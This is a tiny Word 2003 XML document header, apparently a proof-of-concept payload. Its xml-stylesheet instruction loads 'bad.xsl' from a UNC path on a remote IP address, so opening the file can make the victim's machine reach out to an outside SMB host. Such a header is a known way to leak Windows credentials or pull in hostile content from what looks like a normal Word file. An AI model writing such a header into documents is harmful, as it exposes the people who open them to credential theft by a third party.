<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<?mso-application progid="Word.Document"?>
<?xml-stylesheet type="text/xsl" href="\\10.21.156.104\bad.xsl" ?>